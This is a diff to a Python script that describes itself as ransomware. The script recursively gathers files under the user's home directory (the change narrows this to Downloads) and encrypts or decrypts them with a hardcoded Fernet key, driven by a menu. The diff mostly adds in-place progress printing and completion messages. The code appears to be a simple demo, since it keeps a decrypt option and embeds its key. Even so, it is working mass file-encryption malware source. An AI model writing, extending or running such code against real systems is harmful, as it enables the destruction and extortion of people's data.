@@ -1,5 +1,11 @@
 from pathlib import Path
 from cryptography.fernet import Fernet
+import sys
+
+class Printer():
+    def __init__(self,data):
+        sys.stdout.write("\r\x1b[K"+data.__str__())
+        sys.stdout.flush()
 
 def getFiles(p):
     flist = p.glob('**/*')
@@ -25,7 +31,7 @@ def showMenu():
 print('Calculating number of files..')
 #Configure starting path of the ransomware
 path = Path(Path.home()).absolute()
-foldername = path
+foldername = path / 'Downloads'
 files = getFiles(foldername)
 #Cryptography key
 fernet = Fernet('bjq5lagsjEDIvxmWM6badVWEFD4wSGVatHaSCoYZqeI=')
@@ -37,12 +43,16 @@ opt = showMenu()
 while opt != 9:
     if opt == 1: 
         for index,x in enumerate(files):
-            print(f'Encrypting file {index + 1}/{size}')
+            output = "Encrypting file " + str(index + 1) + '/' + str(size)
+            Printer(output)
             try: encrypt(x)
             except Exception: pass
+        print('\nEncryption process finished\n')
     if opt == 2:
         for index,x in enumerate(files):
-            print(f'Decrypting file {index + 1}/{size}')
+            output = "Decrypting file " + str(index + 1) + '/' + str(size)
+            Printer(output)
             try: decrypt(x)
             except Exception: pass
+        print('\nDecryption process finished\n')
     opt = showMenu()
